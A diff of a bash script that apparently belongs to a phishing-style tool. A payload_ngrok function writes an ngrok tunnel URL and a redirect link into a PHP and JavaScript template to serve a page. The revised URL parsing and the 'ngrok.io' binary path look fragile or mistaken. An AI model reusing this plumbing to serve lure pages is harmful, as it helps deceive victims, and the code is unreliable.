@@ -124,7 +124,7 @@ printf '\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] Direct link:\e[0m\e[1;77m %s\n' $s
 
 payload_ngrok() {
 
-link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
+link=$(curl -sSL http://localhost:4040/api/tunnels|cut -d '"' -f14|awk -F "/" '{print $3}'|cut -d ":" -f2)
 sed 's+forwarding_link+'$link'+g' template.php > index.php
 sed 's+redirect_link+'$redirect_link'+g' js/_app.js > js/app.js
 
@@ -136,8 +136,8 @@ ngrok_server() {
 
 if [[ -e ngrok ]]; then
 echo ""
-elif [[ -e $PREFIX/bin/ngrok ]]; then
-	ln -s $PREFIX/bin/ngrok $PWD/ngrok
+elif [[ -e $PREFIX/bin/ngrok.io ]]; then
+	ln -s $PREFIX/bin/ngrok.io $PWD/ngrok
 else
 command -v unzip > /dev/null 2>&1 || { echo >&2 "I require unzip but it's not installed. Install it. Aborting."; exit 1; }
 command -v wget > /dev/null 2>&1 || { echo >&2 "I require wget but it's not installed. Install it. Aborting."; exit 1; }
